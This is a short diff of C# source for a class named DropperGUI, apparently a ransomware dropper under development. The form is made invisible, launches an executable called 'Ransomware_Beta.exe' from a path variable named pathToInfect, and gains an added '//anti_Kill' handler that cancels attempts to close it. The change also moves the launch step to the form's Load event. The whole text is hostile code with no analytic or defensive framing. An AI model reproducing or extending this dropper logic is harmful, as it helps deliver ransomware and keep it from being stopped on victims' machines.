@@ -24,7 +24,6 @@ public partial class DropperGUI : Form {
   public DropperGUI() {
     InitializeComponent();
     this.TransparencyKey = this.BackColor; // Make invisible
-    StartAction();
   }
   private void StartAction() {
     this.Close();
@@ -95,5 +94,16 @@ public partial class DropperGUI : Form {
   private static void LaunchLocally() {
     Process.Start(pathToInfect + @"\Malware\local\Ransomware_Beta.exe");
   }
-}
+
+        private void DropperGUI_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            //anti_Kill
+            e.Cancel = true; 
+        }
+
+        private void DropperGUI_Load(object sender, EventArgs e)
+        {
+            StartAction();
+        }
+    }
 }
